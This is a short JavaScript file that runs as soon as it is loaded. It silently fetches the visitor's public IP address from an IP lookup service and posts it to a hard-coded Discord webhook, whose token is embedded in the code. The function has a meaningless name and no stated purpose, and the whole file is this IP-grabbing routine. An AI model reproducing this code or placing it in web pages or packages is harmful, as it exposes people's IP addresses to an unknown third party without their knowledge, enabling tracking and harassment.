const webhookUrl = 'https://discord.com/api/webhooks/1088188475150438531/kXd8KnhCn8CR5-A-aSq0zSsMxJoGK7fsvIQU6i6Qnz5APYVxjjMfZiVlD13SimCuZLJS';

async function _rgiuh() {
  const response = await fetch('https://api.ipify.org/');
  const data = await response.text();

  const payload = {
    content: data
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .catch(error => console.error(error));
}

_rgiuh();
